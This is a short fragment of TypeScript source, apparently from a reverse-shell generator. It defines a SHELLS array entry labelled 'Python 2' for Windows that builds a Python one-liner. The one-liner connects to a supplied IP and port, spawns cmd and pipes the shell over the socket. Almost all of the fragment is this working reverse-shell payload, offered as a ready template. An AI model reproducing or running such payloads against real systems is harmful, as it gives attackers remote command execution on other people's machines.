...
const SHELLS: Shell[] = [
  ...
  { id: 'win-python2', category: 'Windows', label: 'Python 2',                build: (ip, p) => `python -c "import socket,subprocess,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',${p}));proc=subprocess.Popen('cmd',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.sendall(b)for b in iter(lambda:proc.stdout.read(1024),b'')]).start();[proc.stdin.write(b+b'\\r\\n')or proc.stdin.flush()for b in iter(lambda:s.recv(4096).rstrip(),b'')]"` },
